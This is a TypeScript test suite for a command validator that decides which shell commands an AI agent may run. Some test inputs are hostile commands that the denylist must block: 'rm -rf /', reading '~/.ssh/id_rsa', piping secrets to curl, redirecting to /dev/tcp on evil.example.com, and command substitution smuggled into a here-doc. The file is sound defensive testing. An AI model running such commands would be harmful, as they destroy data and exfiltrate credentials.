import { describe, expect, test } from 'bun:test';
import { CommandValidator, getBuiltinPayloadCommandInvocation } from '../src/tools/command-validator';
import * as path from 'path';
import * as os from 'os';
import * as fs from 'node:fs';

describe('CommandValidator', () => {
  const projectRoot = path.join(os.tmpdir(), 'test-project');

  // Setup test directory
  if (!fs.existsSync(projectRoot)) {
    fs.mkdirSync(projectRoot, { recursive: true });
  }

  describe('Auto-allow cd', () => {
    test('allows cd within project', async () => {
      const validator = new CommandValidator(['echo *'], projectRoot);
      const result = await validator.validate('cd src');
      expect(result.allowed).toBe(true);
      expect(result.matchedPattern).toBe('cd *');
    });

    test('allows cd in compound commands', async () => {
      const validator = new CommandValidator(['./server.sh *'], projectRoot);
      const result = await validator.validate('cd dir && ./server.sh start');
      expect(result.allowed).toBe(true);
    });
  });

  describe('Structured pattern matching', () => {
    test('matches git push with wildcards', async () => {
      const validator = new CommandValidator(['git push *'], projectRoot);
      const result = await validator.validate('git push origin main');
      expect(result.allowed).toBe(true);
      expect(result.matchedPattern).toContain('git push *');
    });

    test('matches npm run with subcommand', async () => {
      const validator = new CommandValidator(['npm run *'], projectRoot);
      const result = await validator.validate('npm run build');
      expect(result.allowed).toBe(true);
    });

    test('blocks commands not in allowlist', async () => {
      const validator = new CommandValidator(['git status'], projectRoot);
      const result = await validator.validate('git push origin main');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('not in allowlist');
    });
  });

  describe('Pattern priority', () => {
    test('more specific patterns override general ones', async () => {
      const validator = new CommandValidator(
        ['git *', 'git push *'],
        projectRoot
      );

      // Both patterns should allow git push
      const result = await validator.validate('git push origin main');
      expect(result.allowed).toBe(true);
    });

    test('longer patterns are more specific', async () => {
      const validator = new CommandValidator(
        ['*', 'git *', 'git push *'],
        projectRoot
      );

      const result = await validator.validate('git push origin main');
      expect(result.allowed).toBe(true);
      // Should match the most specific pattern
      expect(result.matchedPattern).toContain('git push *');
    });
  });

  describe('Compound commands', () => {
    test('validates all commands in pipeline', async () => {
      const validator = new CommandValidator(
        ['echo *', 'grep *'],
        projectRoot
      );

      const result = await validator.validate('echo hello | grep lo');
      expect(result.allowed).toBe(true);
    });

    test('blocks if any command in chain fails', async () => {
      const validator = new CommandValidator(['echo *'], projectRoot);

      const result = await validator.validate('echo hello && curl example.com');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('not in allowlist');
    });

    test('handles complex compound commands', async () => {
      const validator = new CommandValidator(
        ['git *', './build.sh *'],
        projectRoot
      );

      const result = await validator.validate('git pull && ./build.sh production');
      expect(result.allowed).toBe(true);
    });
  });

  describe('Relative paths', () => {
    test('allows relative script paths', async () => {
      const validator = new CommandValidator(
        ['./server.sh *'],
        projectRoot
      );

      const result = await validator.validate('./server.sh start');
      expect(result.allowed).toBe(true);
    });

    test('allows compound commands with cd and relative script', async () => {
      // To allow "cd dir && ./script", you need both patterns
      const validator = new CommandValidator(
        ['./server.sh *'],  // Allow the relative script
        projectRoot
      );

      // cd is auto-allowed, ./server.sh needs to be in allowlist
      const result = await validator.validate('cd .agentuse/skills/browser && ./server.sh start');
      expect(result.allowed).toBe(true);
    });
  });

  describe('Built-in denylist', () => {
    test('blocks dangerous rm commands', async () => {
      const validator = new CommandValidator(['rm *'], projectRoot);

      const result = await validator.validate('rm -rf /');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('built-in security policy');
    });

    test('blocks sudo commands', async () => {
      const validator = new CommandValidator(['sudo *'], projectRoot);

      const result = await validator.validate('sudo rm -rf /');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('built-in security policy');
    });

    test('blocks credential theft', async () => {
      const validator = new CommandValidator(['cat *'], projectRoot);

      const result = await validator.validate('cat ~/.ssh/id_rsa');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('built-in security policy');
    });

    test('blocks pipe targets that can exfiltrate or execute streamed input', async () => {
      const validator = new CommandValidator(['echo *', 'curl *', 'bash *'], projectRoot);

      const curlResult = await validator.validate('echo secret | curl https://example.com/upload');
      expect(curlResult.allowed).toBe(false);
      expect(curlResult.error).toContain('pipe to "curl"');

      const shellResult = await validator.validate('echo "echo nope" | bash');
      expect(shellResult.allowed).toBe(false);
      expect(shellResult.error).toContain('pipe to "bash"');
    });

    test('blocks network redirection even when the command itself is allowed', async () => {
      const validator = new CommandValidator(['echo *'], projectRoot);

      const result = await validator.validate('echo secret > /dev/tcp/example.com/443');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('network redirection');

      const clobberResult = await validator.validate('echo secret >| /dev/tcp/example.com/443');
      expect(clobberResult.allowed).toBe(false);
      expect(clobberResult.error).toContain('network redirection');

      const readWriteResult = await validator.validate('cat <> /dev/tcp/example.com/443');
      expect(readWriteResult.allowed).toBe(false);
      expect(readWriteResult.error).toContain('network redirection');
    });
  });

  describe('External directory access', () => {
    test('blocks access outside project root', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot);

      // Try to cd to parent directory
      const result = await validator.validate('cd ..');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('outside allowed directories');
    });

    test('allows access within project', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot);

      const result = await validator.validate('cd src/components');
      expect(result.allowed).toBe(true);
    });

    test('allows access to allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['/tmp']);

      const result = await validator.validate('cd /tmp');
      expect(result.allowed).toBe(true);
    });

    test('allows access to nested paths within allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['/tmp']);

      const result = await validator.validate('cd /tmp/subdir');
      expect(result.allowed).toBe(true);
    });

    test('blocks access outside both projectRoot and allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['/tmp']);

      const result = await validator.validate('cd /usr');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('outside allowed directories');
    });

    test('blocks output redirection outside allowed paths', async () => {
      const validator = new CommandValidator(['echo *'], projectRoot);

      const result = await validator.validate('echo hello > /tmp/agentuse-outside.txt');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('outside allowed directories');
    });

    test('allows /dev stream sinks without any allowedPaths grant', async () => {
      const validator = new CommandValidator(['date *', 'ls *', 'echo *'], projectRoot);

      // The exact shape that got blocked in the wild: a stderr-discard redirect.
      const discard = await validator.validate('ls src 2>/dev/null');
      expect(discard.allowed).toBe(true);

      const compound = await validator.validate('date -u && ls src 2>/dev/null');
      expect(compound.allowed).toBe(true);

      const toStderr = await validator.validate('echo failed >/dev/stderr');
      expect(toStderr.allowed).toBe(true);
    });

    test('still blocks non-stream /dev paths and network redirection', async () => {
      const validator = new CommandValidator(['cat *', 'echo *'], projectRoot);

      const device = await validator.validate('cat /dev/disk0');
      expect(device.allowed).toBe(false);
      expect(device.error).toContain('outside allowed directories');

      const network = await validator.validate('echo x > /dev/tcp/evil.example.com/80');
      expect(network.allowed).toBe(false);
    });

    test('supports multiple allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['/tmp', '/var']);

      const result1 = await validator.validate('cd /tmp');
      expect(result1.allowed).toBe(true);

      const result2 = await validator.validate('cd /var');
      expect(result2.allowed).toBe(true);
    });

    test('supports ~ in allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['~']);

      const homeDir = process.env.HOME || '/tmp';
      const result = await validator.validate(`cd ${homeDir}`);
      expect(result.allowed).toBe(true);
    });

    test('supports ${tmpDir} in allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['${tmpDir}'], { projectRoot });

      // Use resolved real path (handles macOS /var -> /private/var symlink)
      let tmpDir = os.tmpdir();
      try {
        tmpDir = fs.realpathSync(tmpDir);
      } catch { /* ignore */ }
      const result = await validator.validate(`cd ${tmpDir}`);
      expect(result.allowed).toBe(true);
    });

    test('supports ${tmpDir} with custom value', async () => {
      const customTmpDir = '/custom/tmp';
      const validator = new CommandValidator(['cd *'], projectRoot, ['${tmpDir}'], { projectRoot, tmpDir: customTmpDir });

      const result = await validator.validate('cd /custom/tmp');
      expect(result.allowed).toBe(true);

      // Should NOT allow default system tmpdir (resolved to real path)
      let sysTmpDir = os.tmpdir();
      try {
        sysTmpDir = fs.realpathSync(sysTmpDir);
      } catch { /* ignore */ }
      const result2 = await validator.validate(`cd ${sysTmpDir}`);
      expect(result2.allowed).toBe(false);
    });

    test('supports ${root} in allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['${root}/other'], { projectRoot });

      const result = await validator.validate(`cd ${projectRoot}/other`);
      expect(result.allowed).toBe(true);
    });

    test('supports ${agentDir} in allowedPaths when provided', async () => {
      const agentDir = path.join(projectRoot, 'agents');
      const validator = new CommandValidator(['cd *'], projectRoot, ['${agentDir}'], { projectRoot, agentDir });

      const result = await validator.validate(`cd ${agentDir}`);
      expect(result.allowed).toBe(true);
    });

    test('does not resolve ${agentDir} when not provided', async () => {
      const outsideDir = '/outside/agents';
      const validator = new CommandValidator(['cd *'], projectRoot, ['${agentDir}'], { projectRoot });

      // ${agentDir} won't be resolved, so pattern "${agentDir}" won't match /outside/agents
      // This path is also outside project root, so it should be blocked
      const result = await validator.validate(`cd ${outsideDir}`);
      expect(result.allowed).toBe(false);
    });

    test('resolves ${agentDir} to allow access when provided', async () => {
      const outsideAgentDir = '/outside/agents';
      const validator = new CommandValidator(['cd *'], projectRoot, ['${agentDir}'], { projectRoot, agentDir: outsideAgentDir });

      // With agentDir provided, ${agentDir} resolves to /outside/agents, so it should be allowed
      const result = await validator.validate(`cd ${outsideAgentDir}`);
      expect(result.allowed).toBe(true);
    });
  });

  describe('Edge cases', () => {
    test('allows agent-browser eval payloads with JavaScript syntax as one built-in payload command', async () => {
      const validator = new CommandValidator(['agent-browser eval *'], projectRoot);

      const result = await validator.validate('agent-browser eval Array.from(document.querySelectorAll(\'a[href*="/in/"]\')).map(a=>({text:a.innerText,href:a.href})).slice(0,20)');

      expect(result.allowed).toBe(true);
      expect(result.matchedPattern).toBe('agent-browser eval *');
    });

    test('allows quoted agent-browser eval payloads with shell-like JavaScript tokens', async () => {
      const validator = new CommandValidator(['agent-browser eval *'], projectRoot);

      const result = await validator.validate(String.raw`agent-browser eval "(() => {const html=document.documentElement.innerHTML; const ids=[...new Set([...html.matchAll(/urn:li:activity:([0-9]+)/g)].map(m=>m[1]))]; return ids.map(id=>{const i=html.indexOf(id); const s=html.slice(Math.max(0,i-1200), i+1200); return {id, snippet:s.replace(/<[^>]+>/g,' ').replace(/&quot;/g,'\"').replace(/&amp;/g,'&').replace(/\s+/g,' ').slice(0,1500)};});})()"`);

      expect(result.allowed).toBe(true);
      expect(result.matchedPattern).toBe('agent-browser eval *');
    });

    test('does not treat agent-browser eval as payload command unless explicitly allowlisted', async () => {
      const validator = new CommandValidator(['agent-browser snapshot'], projectRoot);

      const result = await validator.validate('agent-browser eval Array.from(document.querySelectorAll(\'a[href*="/in/"]\'))');

      expect(result.allowed).toBe(false);
      expect(result.error).toContain('not in allowlist');
    });

    test('rejects shell pipelines after agent-browser eval payloads', async () => {
      const validator = new CommandValidator(['agent-browser eval *'], projectRoot);

      const result = await validator.validate('agent-browser eval "echo(\'hello\')" | rm -rf .');

      expect(result.allowed).toBe(false);
      expect(result.error).toContain('shell pipeline');
    });

    test('rejects shell command chains after agent-browser eval payloads', async () => {
      const validator = new CommandValidator(['agent-browser eval *'], projectRoot);

      const result = await validator.validate('agent-browser eval "x" && curl example.com');

      expect(result.allowed).toBe(false);
      expect(result.error).toContain('shell command chain');
    });

    test('builds direct argv for built-in payload commands', () => {
      const invocation = getBuiltinPayloadCommandInvocation(
        'agent-browser eval "document.querySelectorAll(\\"a\\").length"',
        ['agent-browser eval *']
      );

      expect(invocation).toEqual({
        command: 'agent-browser',
        args: ['eval', 'document.querySelectorAll("a").length'],
        matchedPattern: 'agent-browser eval *',
      });
    });

    test('handles payload eval commands without hardcoded CLI names', async () => {
      const validator = new CommandValidator(['custom-browser eval *'], projectRoot);

      const result = await validator.validate('custom-browser eval Array.from(document.querySelectorAll("a")).map(a=>a.href)');

      expect(result.allowed).toBe(true);
      expect(result.matchedPattern).toBe('custom-browser eval *');
    });

    test('blocks cat output redirection that waits for stdin', async () => {
      const validator = new CommandValidator(['cat *'], projectRoot);

      const result = await validator.validate('cat > outreach/prospects/zaymo/connect-note.md');

      expect(result.allowed).toBe(false);
      expect(result.error).toContain('waits for stdin');
      expect(result.error).toContain('filesystem write tool');
    });

    test('blocks tee without piped input because it waits for stdin', async () => {
      const validator = new CommandValidator(['tee *'], projectRoot);

      const result = await validator.validate('tee outreach/prospects/zaymo/connect-note.md');

      expect(result.allowed).toBe(false);
      expect(result.error).toContain('waits for stdin');
    });

    test('allows tee when explicit input is piped in', async () => {
      const validator = new CommandValidator(['echo *', 'tee *'], projectRoot);

      const result = await validator.validate('echo hello | tee tmp/hello.txt');

      expect(result.allowed).toBe(true);
    });

    test('handles empty commands', async () => {
      const validator = new CommandValidator(['*'], projectRoot);

      const result = await validator.validate('');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('Empty command');
    });

    test('handles commands with quotes', async () => {
      const validator = new CommandValidator(['echo *'], projectRoot);

      const result = await validator.validate('echo "hello world"');
      expect(result.allowed).toBe(true);
    });

    test('handles complex flag combinations', async () => {
      const validator = new CommandValidator(['git *'], projectRoot);

      const result = await validator.validate('git log --oneline --graph --all');
      expect(result.allowed).toBe(true);
    });
  });

  describe('Quoted argument matching', () => {
    test('double-quoted argument matches unquoted pattern', async () => {
      const validator = new CommandValidator(['curl * https://r.jina.ai/*'], projectRoot);

      const result = await validator.validate(
        'curl -sSL --max-time 45 "https://r.jina.ai/https://example.com/x" -o tmp/fetched.txt'
      );
      expect(result.allowed).toBe(true);
    });

    test('single-quoted argument matches unquoted pattern', async () => {
      const validator = new CommandValidator(['curl * https://r.jina.ai/*'], projectRoot);

      const result = await validator.validate("curl -sSL 'https://r.jina.ai/https://example.com/x'");
      expect(result.allowed).toBe(true);
    });

    test('trailing arguments after last pattern token are allowed', async () => {
      const validator = new CommandValidator(['curl * https://r.jina.ai/*'], projectRoot);

      const result = await validator.validate('curl https://r.jina.ai/https://example.com/x -o tmp/out.txt');
      expect(result.allowed).toBe(true);
    });

    test('quoting does not bypass the allowlist', async () => {
      const validator = new CommandValidator(['curl * https://r.jina.ai/*'], projectRoot);

      const result = await validator.validate('curl "https://evil.example.com/x"');
      expect(result.allowed).toBe(false);
    });
  });

  describe('Here-doc payloads', () => {
    // A here-doc body is stdin data, not shell. The character scanners used by
    // the path check and the shell-operator denylist read the raw command
    // string, so before maskInertPayloads() they parsed JavaScript as shell.
    // Deliberately not an `X eval *` pattern: those take a separate payload-command
    // path that never reaches the parser.
    const heredoc = (body: string, delimiter = "'EOF'") =>
      `js-runtime run <<${delimiter}\n${body}\nEOF`;

    const runtime = () => new CommandValidator(['js-runtime run *'], projectRoot);

    test('arrow function followed by a regex literal is not a redirect', async () => {
      // Reported as: Path outside allowed directories. Add "/^\d+$" to allowedPaths
      const result = await runtime().validate(
        heredoc('const i = btns.findIndex((t, i) => /^\\d+$/.test(t) && btns[i - 1]);')
      );
      expect(result.allowed).toBe(true);
    });

    test('arrow function followed by a newline and a path string is not a redirect', async () => {
      const result = await runtime().validate(heredoc("const a = list.find(x =>\n  '/@leonho'\n);"));
      expect(result.allowed).toBe(true);
    });

    test('a template literal containing markup is not a redirect', async () => {
      const result = await runtime().validate(heredoc('const s = `<a href="/x">hi</a>`;'));
      expect(result.allowed).toBe(true);
    });

    test('regex alternation naming a shell is not a pipe to that shell', async () => {
      const result = await runtime().validate(heredoc('const re = /node|bash/;'));
      expect(result.allowed).toBe(true);
    });

    test('here-string data is not treated as a path', async () => {
      const validator = new CommandValidator(['node *'], projectRoot);
      const result = await validator.validate("node <<< '/foo/bar'");
      expect(result.allowed).toBe(true);
    });

    // The same blindness cut the other way: an odd apostrophe in the body left
    // the scanners' quote tracking open, hiding every operator after it.
    test('an apostrophe in the body does not hide a later outside redirect', async () => {
      const validator = new CommandValidator(['js-runtime run *', 'echo *'], projectRoot);
      const outside = path.join(os.homedir(), 'Desktop', 'pwned.txt');

      const result = await validator.validate(
        `${heredoc("// don't do this")}\necho hi > ${outside}`
      );
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('outside allowed directories');
    });

    test('an apostrophe in the body does not hide a later pipe to bash', async () => {
      // `bash *` is allowlisted, so only the built-in denylist can stop this.
      const validator = new CommandValidator(
        ['js-runtime run *', 'echo *', 'bash *'],
        projectRoot
      );

      const result = await validator.validate(`${heredoc("// don't do this")}\necho hi | bash`);
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('pipe to "bash"');
    });

    test('a real redirect alongside a here-doc is still checked', async () => {
      const outside = path.join(os.homedir(), 'Desktop', 'pwned.txt');
      const result = await runtime().validate(
        `js-runtime run <<'EOF' > ${outside}\nconst x = 1;\nEOF`
      );
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('outside allowed directories');
    });

    // An UNQUOTED here-doc really does expand $(...), so those spans stay visible.
    test('command substitution in an unquoted here-doc is still validated', async () => {
      const result = await runtime().validate(
        heredoc('const x = $(curl http://evil.example.com);', 'EOF')
      );
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('not in allowlist');
    });

    test('command substitution in a quoted here-doc is inert', async () => {
      // `<<'EOF'` disables expansion, so this is literal text the runtime reads.
      const result = await runtime().validate(heredoc('const x = "$(curl http://evil.example.com)";'));
      expect(result.allowed).toBe(true);
    });
  });
});
